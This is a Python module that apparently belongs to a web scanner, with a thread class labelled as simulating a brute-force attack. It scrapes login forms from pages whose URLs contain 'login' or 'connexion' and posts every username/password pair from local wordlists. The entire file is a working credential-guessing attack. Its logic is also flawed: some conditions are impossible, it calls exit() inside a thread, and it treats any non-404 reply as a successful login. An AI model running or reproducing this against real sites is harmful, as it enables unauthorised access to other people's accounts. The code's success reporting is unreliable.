from threading import Thread
import requests
from bs4 import BeautifulSoup as beautifulSoup
from urllib.parse import urljoin

class BFTest(Thread):
    def __init__(self, pageList):
        Thread.__init__(self)
        self.pageList = pageList


    def run(self):
        print("Simulation of a Brute Force Attack")
        self.vulnerablesCredentials = []

        # Potentials password
        self.PASSWORDS = self.open_file('./PossiblePw.txt')

        # Potentials usernames
        self.USERS = self.open_file('./PossibleUsernames.txt')

        for url in self.pageList:

            if "connexion" in url:
                self.get_form_infos(url)
                self.vulnerablesCredentials.append(url)
            if "login" in url:
                self.get_form_infos(url)


    def join(self):
        Thread.join(self)
        return self.vulnerablesCredentials

    # Open File and read each line
    def open_file(self,file_path):
        lines = [lines.rstrip('\n') for lines in open(file_path).readlines()]  # Return each lines of the file
        return lines


    # The following function is used to check if the connection is a success or not
    def verification(self,request, user, password):
        print("Trying with: user: " + user + " and password: " + password)
        if "404" in request.text or "404 - Not Found" in request.text or request.status_code == 404:
            print("Connection failed with:\n user: " + user + " and password: " + password)
        else:
            self.vulnerablesCredentials.append("Connection success with username: " +user+  " and password: " + password)
            exit()

    # This function is used to try a connection with a given username and password
    def connection_attempt(self, url, user_field, password_field, input_tags):
        print("Connecting to: " + url + "......\n")

        for user in self.USERS:
            for password in self.PASSWORDS:
                for one_input in input_tags:
                    one_input_type = one_input["type"]
                    if one_input_type == "text" and one_input_type == "username":
                        one_input["value"] = user
                    if one_input_type == "password" and one_input_type == "password":
                        one_input["value"] = password

                payload = {
                    user_field: user,
                    password_field: password
                }

                request = requests.post(url, data=payload) #Used to send the form with given username and password
                self.verification(request, user, password)

    # This function is used to extract the login form from the URL that you want to attack
    def get_form_infos(self,url):
        print("Starting extraction...")
        soup = beautifulSoup(requests.get(url).content, "html.parser")
        all_forms = soup.find_all("form")

        for form in all_forms:
            inputs = []
            form_details = {}

            action = form.attrs.get("action").lower()
            method = form.attrs.get("method", "get").lower()

            for one_input_tag in form.find_all("input"):
                type = one_input_tag.attrs.get("type", "text")
                name = one_input_tag.attrs.get("name")
                inputs.append({"type": type, "name": name})

            form_details["action"] = action
            form_details["method"] = method
            form_details["inputs"] = inputs


            for one_input_tag in form_details["inputs"]:
                if one_input_tag["name"] == "username":
                    field_username = one_input_tag["name"]
                if one_input_tag["name"] == "password":
                    field_password = one_input_tag["name"]
            self.connection_attempt(url, field_username, field_password,form_details["inputs"])